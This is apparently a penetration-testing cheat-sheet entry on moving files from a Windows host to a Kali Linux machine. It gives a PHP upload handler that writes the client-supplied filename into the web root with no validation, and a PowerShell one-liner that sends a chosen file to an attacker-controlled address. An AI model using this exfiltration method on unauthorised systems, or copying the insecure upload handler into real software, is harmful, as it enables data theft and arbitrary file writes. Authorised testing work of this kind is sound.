# Windows Uploads

If we want to transfer files, in this case from Windows to linux, we can use some of the following techniques:

#### Hosting an uploads.php file

**Step 1:** Create the following php file on Kali:

```bash
<?php
$uploaddir = '/var/www/html/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?>
```

**Step 2:** Create the 'uploads' directory and set owner permissions to www-data:

```bash
mkdir /var/www/html/uploads && chown www-data: /var/www/html/uploads
```

**Step 3:** Restart Apache2 service:

```bash
sudo systemctl restart apache2
```

**Step 4:** Upload the file executing the following command in a Windows cmd:

```bash
powershell (New-Object System.Net.WebClient).UploadFile('http://$IPADDRESS/uploads/uploads.php', '$FILETOUPLOAD')
```
